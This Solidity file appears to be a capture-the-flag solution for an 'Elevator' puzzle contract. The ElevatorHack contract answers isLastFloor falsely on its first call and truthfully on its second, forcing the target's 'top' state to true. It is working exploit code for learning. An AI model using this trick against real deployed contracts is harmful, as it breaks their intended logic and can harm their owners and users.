pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint) external;
}

contract ElevatorHack {

    uint256 private callCount;
    Elevator public immutable elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (callCount == 0) {
            callCount = 1;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        elevator.goTo(42);
    }

} // Notes: This contract abuses the fact that the elevator runs `isLastFloor()` twice in the same transaction - first in the if condition check, then when updating the `top` state variable